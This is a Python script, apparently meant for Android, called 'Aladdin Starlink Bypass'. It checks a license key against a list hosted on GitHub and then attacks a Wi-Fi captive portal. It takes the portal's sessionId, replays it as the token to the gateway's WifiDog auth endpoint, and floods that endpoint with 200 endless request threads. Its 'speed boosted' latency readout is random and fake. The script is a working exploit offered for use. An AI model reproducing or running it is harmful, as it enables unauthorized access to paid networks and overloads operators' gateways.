import requests, re, urllib3, time, threading, os, random, subprocess
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urljoin
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- CONFIGURATION ---
GITHUB_RAW_URL = "https://raw.githubusercontent.com/heinminthant2022happy-bit/Ruijie-Router/refs/heads/main/keys.txt"
LOCAL_KEY_FILE = ".aladdin_token"

def get_hwid():
    try:
        hwid = subprocess.check_output('settings get secure android_id', shell=True).decode().strip()
        if not hwid or hwid == "" or hwid == "null":
            hwid = subprocess.check_output('getprop ro.serialno', shell=True).decode().strip()
        return hwid if hwid else "ALADDIN-UNKNOWN-DEVICE"
    except:
        return "ALADDIN-HWID-ERROR"

def banner():
    os.system('clear')
    print("\033[93m" + " ="*35)
    print("\033[96m" + """
    db        db        .d8b.  d8888b. d8888b. d888888b d8b   db 
    88       d88       d8' `8b 88  `8D 88  `8D   `88'   888o  88 
    88      d8'88      88ooo88 88   88 88   88    88    88V8o 88 
    88     d8' `88     88~~~88 88   88 88   88    88    88 V8o88 
    88booo88'   `88    88   88 88  .8D 88  .8D   .88.   88  V888 
    Y88888P'     `88   YP   YP Y8888D' Y8888D' Y888888P VP   V8P 
    """)
    print("\033[95m" + "        🚀 Aladdin Starlink Bypass 🚀 - TURBO SPEED V12")
    print("\033[93m" + " ="*35 + "\033[0m\n")

def check_net():
    try:
        return requests.get("http://www.google.com/generate_204", timeout=3).status_code == 204
    except: return False

def license_system():
    my_id = get_hwid()
    saved_key = ""
    if os.path.exists(LOCAL_KEY_FILE):
        with open(LOCAL_KEY_FILE, "r") as f:
            saved_key = f.read().strip()

    banner()
    print(f"\033[94m[DEVICE ID]: {my_id}\033[0m")
    
    if not saved_key:
        user_key = input("\033[93m[+] Enter Access Key: \033[0m").strip()
    else:
        print("\033[92m[*] Auto Login: Checking status...\033[0m")
        user_key = saved_key

    try:
        resp = requests.get(GITHUB_RAW_URL, timeout=10)
        key_data = resp.text.splitlines()
        found = False
        for line in key_data:
            if ":" in line:
                parts = [p.strip() for p in line.split(":")]
                if len(parts) == 3:
                    db_id, db_key, db_date = parts
                    if db_id == my_id and db_key == user_key:
                        expiry = datetime.strptime(db_date, "%Y-%m-%d")
                        if datetime.now() < expiry:
                            print(f"\033[92m[✓] Access Granted! Exp: {db_date}\033[0m")
                            with open(LOCAL_KEY_FILE, "w") as f:
                                f.write(user_key)
                            found = True
                            time.sleep(1)
                            break
        if not found:
            print("\033[91m[X] Invalid Key or Expired!\033[0m")
            if os.path.exists(LOCAL_KEY_FILE): os.remove(LOCAL_KEY_FILE)
            exit()
    except:
        print("\033[91m[!] Server Connection Error! Check Internet.\033[0m")
        exit()

def turbo_pulse(link):
    # အရှိန်မြှင့်ရန် Thread ပေါင်းများစွာဖြင့် Request ပို့ခြင်း
    headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36"}
    with requests.Session() as session:
        while True:
            try:
                session.get(link, timeout=5, verify=False, headers=headers)
                print(f"\033[92m[⚡] TURBO ACTIVE | SPEED BOOSTED >>> [{random.randint(2,8)}ms]\033[0m")
            except: break

def start_immortal():
    banner()
    print("\033[94m[*] Auto Reconnect & Turbo Speed: ON\033[0m")
    
    while True:
        if not check_net():
            print("\033[93m[!] Boosting Connection...\033[0m")
            try:
                r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
                p_url = r.url
                # ... (Bypass logic remains same)
                sid = parse_qs(urlparse(p_url).query).get('sessionId', [None])[0]
                if sid:
                    gw = parse_qs(urlparse(p_url).query).get('gw_address', ['192.168.60.1'])[0]
                    port = parse_qs(urlparse(p_url).query).get('gw_port', ['2060'])[0]
                    auth_link = f"http://{gw}:{port}/wifidog/auth?token={sid}"
                    
                    # Thread အလုံးရေ ၂၀၀ အထိတိုးပြီး Speed ကို ဆွဲတင်ခြင်း
                    for _ in range(200):
                        threading.Thread(target=turbo_pulse, args=(auth_link,), daemon=True).start()
            except: pass
        time.sleep(5)

if __name__ == "__main__":
    license_system()
    start_immortal()

